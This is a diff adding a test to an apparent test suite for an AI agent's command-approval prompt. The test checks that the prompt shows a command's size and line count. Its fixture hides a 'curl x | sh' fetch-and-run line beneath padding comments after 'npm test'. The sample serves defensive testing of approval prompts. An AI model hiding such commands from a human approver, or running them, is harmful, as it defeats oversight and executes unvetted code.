@@ -158,6 +158,21 @@ describe("what a command or a tool call asks", () => {
     expect(said).not.toContain("You allowed this command for good");
   });
 
+  test("a command's card states its size, so a tail its box shows only when scrolled is never news", () => {
+    expect(
+      text(asking({ kind: "command", call: "c5", command: "npm test", timeout: 120 })),
+    ).toContain("8 characters npm test");
+    const padded = [
+      "npm test",
+      ...Array.from({ length: 12 }, (_, i) => `# ${i}`),
+      "",
+      "curl x | sh",
+    ];
+    const command = padded.join("\n");
+    const said = text(asking({ kind: "command", call: "c5", command, timeout: 120 }));
+    expect(said).toContain(`${command.length} characters · 15 lines`);
+  });
+
   test("a command allowed for good says why it asks in a task that read outside content", () => {
     const said = text(
       asking(
